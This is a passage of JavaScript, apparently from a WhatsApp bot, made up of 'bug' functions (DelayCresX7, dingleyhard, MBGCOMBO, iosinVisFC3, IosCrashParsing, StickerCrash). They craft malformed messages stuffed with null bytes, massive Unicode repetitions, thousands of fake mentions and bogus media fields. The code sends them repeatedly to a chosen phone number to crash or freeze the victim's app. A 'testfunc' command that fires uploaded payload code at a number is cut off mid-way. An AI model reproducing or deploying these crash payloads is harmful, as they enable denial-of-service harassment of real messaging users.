                }]
            }]
        }]
    });
}

async function DelayCresX7(xylent, target) {
  const msg = {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{
  "currency": "IDR",
  "total_amount": {
    "value": 0,
    "offset": 100
  },
  "reference_id": "${Date.now()}",
  "type": "physical-goods",
  "order": {
    "status": "pending",
    "subtotal": {
      "value": 0,
      "offset": 100
    },
    "order_type": "ORDER",
    "items": [
      {
        "name": "${'ꦾ'.repeat(5000)}",
        "amount": {
          "value": 0,
          "offset": 100
        },
        "quantity": 0,
        "sale_amount": {
          "value": 0,
          "offset": 100
        }
      },
      {
        "name": "${'ꦾ'.repeat(4000)}",
        "amount": {
          "value": 999999999,
          "offset": 100
        },
        "quantity": 999,
        "sale_amount": {
          "value": 999999999,
          "offset": 100
        }
      }
    ]
  },
  "payment_settings": [
    {
      "type": "pix_static_code",
      "pix_static_code": {
        "merchant_name": "X7${'ꦾ'.repeat(3000)}",
        "key": "${'\u0000'.repeat(900000)}",
        "key_type": "AsepX7"
      }
    },
    {
      "type": "credit_card",
      "credit_card": {
        "merchant_name": "${'𑇂𑆵𑆴𑆿'.repeat(2000)}",
        "amount": 999999999
      }
    }
  ],
  "share_payment_status": false,
  "expiry_time": ${Date.now() + 999999999},
  "retry_count": 999
}`
          }
        ]
      },
      contextInfo: {
        stanzaId: "ExplostX7",
        mentionedJid: Array.from({ length: 1000 }, (_, i) => `6281${i}@s.whatsapp.net`),
        forwardingScore: 999999999,
        isForwarded: true
      }
    }
  }

  await xylent.relayMessage(target, msg, { participant: { jid: target } })
}

async function dingleyhard(xylent, target, ptcp = true) {
  const mentionedJidList = [
    "0@s.whatsapp.net",
    ...Array.from({ length: 1917 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
  ];

  const callPermissionMessage = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "XyzenX7",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(10000),
            version: 3
          },
          contextInfo: {
            mentionedJid: mentionedJidList
          }
        }
      }
    }
  };

  const addressMessage = {
    interactiveResponseMessage: {
      body: {
        text: "\u0000".repeat(7000),
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\
                    "values": {\
                        "in_pin_code": "999999",\
                        "building_name": "KANJUT",\
                        "landmark_area": "H",\
                        "address": "XT",\
                        "tower_number": "XTX",\
                        "city": "Garut",\
                        "name": "Jawa_Barat",\
                        "phone_number": "999999999999",\
                        "house_number": "xxx",\
                        "floor_number": "xxx",\
                        "state": "D | ${"\u0000".repeat(900000)}"\
                    }\
                }`,
        version: 3
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 1999 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363403941803439@newsletter",
          newsletterName: "idk",
          serverMessageId: 1000,
          accessibilityText: "idk"
        },
        statusAttributionType: "RESHARED_FROM_MENTION",
        contactVcard: true,
        isSampled: true,
        dissapearingMode: {
          initiator: target,
          initiatedByMe: true
        },
        expiration: Date.now()
      },
    }
  };

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/webp",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "1173741824",
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          isAnimated: false,
          viewOnce: false,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () =>
                "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: { 
                    text: "XyzenX7 𝖤𝗑𝗉𝗅𝗈𝗌𝗍", 
                    format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "call_permission_request",
                      paramsJson: "\u0000".repeat(99999),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 1000; r++) {
    const payload = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "𝖷𝟩 𝖲𝖾𝗏𝖾𝗇 𝖷",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3
            },
            entryPointConversionSource: "{}"
          },
        },
      },
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });

    await xylent.relayMessage(target, {
      groupStatusMessageV2: {
        message: payload.message,
      },
    }, ptcp ? {
      messageId: payload.key.id,
      participant: { jid: target }
    } : {
      messageId: payload.key.id
    });
    await sleep(1000);
  }

  await xylent.relayMessage(target, callPermissionMessage, {
    groupId: null,
    participant: { jid: target }
  });

  await xylent.relayMessage(target, addressMessage, {
    participant: { jid: target }
  });

  const msgLite = generateWAMessageFromContent(target, stickerMsg, {});
  await xylent.relayMessage("status@broadcast", msgLite.message, {
    messageId: msgLite.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });
}


async function MBGCOMBO(xylent, target) {
    let RX7 = await generateWAMessageFromContent(
        target,
        {
      interactiveMessage: {
        header: {
          title: "X7\n\n" + "ꦽ".repeat(50000) + "@5".repeat(50000),
          hasMediaAttachment: false
        },
        body: {
          text: "X7 WAS HERE",
        },
        nativeFlowMessage: {
          messageParamsJson: "",
          buttons: [
            { name: "single_select", buttonParamsJson:  "\u0000" },
            { name: "payment_method", buttonParamsJson:  "\u0000" },
            { name: "call_permission_request", buttonParamsJson:  "\u0000", voice_call: "call_galaxy" },
            { name: "form_message", buttonParamsJson:  "\u0000" },
            { name: "catalog_message", buttonParamsJson:  "\u0000" },
            { name: "send_location", buttonParamsJson:  "\u0000" },
            { name: "view_product", buttonParamsJson:  "\u0000" },
            { name: "payment_status", buttonParamsJson: "\u0000" },
            { name: "cta_call", buttonParamsJson: "\u0000" },
            { name: "cta_url", buttonParamsJson:  "\u0000" },
            { name: "review_and_pay", buttonParamsJson:  "\u0000" }
          ]
        }
      }
     }, { participant: { jid: target}});
  await xylent.relayMessage(target, RX7, {
    messageId: RX7.key.id,
    userJid: target,
    participant: { jid: target },
  });

await xylent.relayMessage(target, {
   groupStatusMessageV2: {  
    message: {
      interactiveResponseMessage: {
        body: {
          text: "X7",
          format: "EXTENSION_1"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"RanstechZvX@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"ok\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
          version: 3
        },
        contextInfo: {
         forwardingScore: 9999,
         isForwarded: true,
         entryPointConversionSource: "payment_method"
        }
      }
    }
   }
  }, { participant: { jid: target }});

  await xylent.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "X7",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target }});
}

async function iosinVisFC3(target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝐍𝐯𝐗 𝐀𝐧𝐭𝐢 𝐀𝐦𝐩𝐚𝐬 𝐁𝐚𝐧𝐠!! ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/asepisheree",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝐍𝐯𝐗 𝐀𝐧𝐭𝐢 𝐀𝐦𝐩𝐚𝐬 𝐁𝐚𝐧𝐠!! ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "𝐀𝐬𝐞𝐩𝐍𝐨𝐭𝐃𝐞𝐯",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝐍𝐯𝐗 𝐀𝐧𝐭𝐢 𝐀𝐦𝐩𝐚𝐬 𝐁𝐚𝐧𝐠!! ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝐍𝐯𝐗 𝐍𝐢𝐡 𝐁𝐨𝐬𝐬" + TravaIphone, 
            matchedText: "𝐀𝐬𝐞𝐩 𝐗 𝐍𝐯𝐗 𝐁𝐨𝐬𝐬",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝐀𝐬𝐞𝐩 𝐗 𝐍𝐯𝐗 𝐁𝐨𝐬𝐬" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 10; i++) {
      await xylent.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await xylent.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await xylent.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await xylent.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await xylent.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 9) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};
async function IosCrashParsing(target) {
  let acep = "\u0010";
  let indah = "𑇂𑆵𑆴𑆿𑆿".repeat(30000);
  let love = "\u0000".repeat(500000);
  let sep = "█".repeat(300000);
  
  let message = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: -999999.999999,
          degreesLongitude: 999999.999999,
          name: acep + indah + love,
          address: acep + indah + love,
          url: `https://asepisheree.${"𑇂𑆵𑆴𑆿".repeat(50000)}.com`,
          contextInfo: {
            participant: target,
            mentionedJid: Array.from({ length: 8000 }, () => "1" + Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"),
            externalAdReply: {
              title: sep,
              body: love,
              mediaType: "VIDEO"
            }
          }
        },
        nativeFlowMessage: {
          name: "galaxy_message",
          paramsJson: "{".repeat(300000) + "}".repeat(300000),
          version: 3
        }
      }
    }
  };
  
  let msg = generateWAMessageFromContent(target, message, {});
  
  await xylent.relayMessage("status@broadcast", msg.message, {
    messageId: "target_" + Date.now(),
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target }
        }]
      }]
    }]
  });
  
  console.log("✅ SUKSES SEND BUG");
}

async function X7Klik(xylent, target) {
    await xylent.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: "Xylent" },
                    footer: { text: "Empire" },
                    contextInfo: {},
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "booking_confirmation",
                                buttonParamsJson: JSON.stringify({
                                    booking_id: "Xylent Empre",
                                    status: "confirmed",
                                    business_name: "XzyenX7",
                                    service_name: "xyzenX7",
                                    appointment_time: "2026-04-28T10:00:00Z",
                                    customer: {
                                        name: "@pinzy",
                                        phone: "628973824776"
                                    }
                                })
                            }
                        ],
                        messageParamsJson: "{".repeat(9999)
                    }
                }
            }
        }
    }, {})
}

async function StickerCrash(xylent, target) {
  const stickers = [
    "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
    "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
    "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
    "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
    "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
    "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
    "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
    "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
    "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
    "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp"
  ];

  const message = {
    stickerPackMessage: {
      stickerPackId: "X",

      name: "./X7" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
      publisher: "./X7" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
      packDescription: "./X7" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
      fileLength: "999999",
      fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
      fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
      mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
      mediaKeyTimestamp: "1741150286",

      directPath:
        "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc",

      trayIconFileName:
        "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",

      thumbnailDirectPath:
        "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc",

      thumbnailSha256:
        "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",

      thumbnailEncSha256:
        "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",

      thumbnailHeight: 252,
      thumbnailWidth: 252,

      imageDataHash:
        "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",

      stickerPackSize: "999999999",
      stickerPackOrigin: "1",

      contextInfo: {
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        },

        forwardedAiBotMessageInfo: {
          botName: "META AI",
          botJid: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
          creatorName: "Bot"
        }
      }
    }
  };

  await xylent.relayMessage(
    target,
    stickers, 
    {
      participant: { jid: target }
    }
  );
  await xylent.relayMessage(
    target,
    message, 
    {
      participant: { jid: target }
    }
  );
}
// Case Test Function
case "testfunc": {
  const tesfunct = "https://f.top4top.io/p_3788vut3d1.jpg";
  
  const args = body.trim().split(" ");
  const targetNumber = args[1]?.replace(/[^0-9]/g, "");
  const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
  const target = targetNumber + "@s.whatsapp.net";

  if (args.length < 3) {
    return xylent.sendMessage(from, {
      text: "🪧 ☇ Format: .testfunc 62xxx 10 (reply function/file)",
    }, { quoted: m});
  }

  if (!targetNumber || isNaN(jumlah) || jumlah <= 0) {
    return xylent.sendMessage(from, {
      text: "❌ ☇ Nomor atau jumlah tidak valid",
    }, { quoted: m});
  }

  const quoted = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  let funcCode = "";

  if (quoted) {
    if (quoted.conversation) {
      funcCode = quoted.conversation;
    } else if (quoted.extendedTextMessage?.text) {
      funcCode = quoted.extendedTextMessage.text;
    } else if (quoted.documentMessage) {
      const docMsg = quoted.documentMessage;
      const fileName = docMsg.fileName || "";

      if (!fileName.endsWith(".js") && !fileName.endsWith(".txt")) {
        return xylent.sendMessage(from, {
          text: "❌ ☇ File harus .js atau .txt",
        }, { quoted: m});
      }

      const stream = await downloadContentFromMessage(docMsg, "document");
      let buffer = Buffer.from([]);
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk]);
      }
      funcCode = buffer.toString("utf-8");
    }
  }

  if (!funcCode) {
    return xylent.sendMessage(from, {
      text: "❌ ☇ Reply function text atau file .js/.txt",
    }, { quoted: m});
  }

  const matchFunc = funcCode.match(/async function\s+([a-zA-Z0-9_]+)/);
  if (!matchFunc) {
    return xylent.sendMessage(from, {
      text: "❌ ☇ Function tidak valid",
    }, { quoted: m});
  }

  const funcName = matchFunc[1];

  // --- REPLIKA STRUKTUR QUOTED CHAT BARU (CONTACT/VCARD VERSI KAMU) ---
  const metaFakeQuoted = {
    key: {
      participant: `13135550002@s.whatsapp.net`,
      ...(typeof botNumber !== 'undefined' && botNumber ? {
        remoteJid: `status@broadcast`
      } : {})
    },
    message: {
      'contactMessage': {
        'displayName': `¡?Xylent Empire?¿`,
